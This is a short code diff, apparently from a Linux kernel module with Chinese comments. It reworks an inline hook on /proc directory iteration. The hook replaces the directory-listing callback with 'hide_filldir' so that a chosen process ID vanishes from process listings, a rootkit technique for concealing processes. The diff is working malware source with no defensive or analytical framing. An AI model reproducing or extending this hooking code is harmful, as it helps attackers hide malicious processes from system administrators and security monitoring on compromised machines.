@@ -45,13 +45,16 @@ static int hide_filldir(struct dir_context *ctx, const char *name, int namlen, l
 }
 #endif
 
-// nline hook 工作函数
-static void proc_iterate_hook_work(struct file *file, struct dir_context *ctx)
+// inline hook 工作函数，返回 0 表示继续执行原函数
+static int proc_iterate_hook_work(struct pt_regs *regs)
 {
+    struct dir_context *ctx = (struct dir_context *)regs->regs[1];
+
     if (!g_hidden_pid || !ctx || ctx->actor == hide_filldir)
-        return;
+        return 0;
     WRITE_ONCE(g_orig_actor, ctx->actor);
     ctx->actor = (filldir_t)hide_filldir;
+    return 0;
 }
 
 // 安装hook,隐藏目标pid
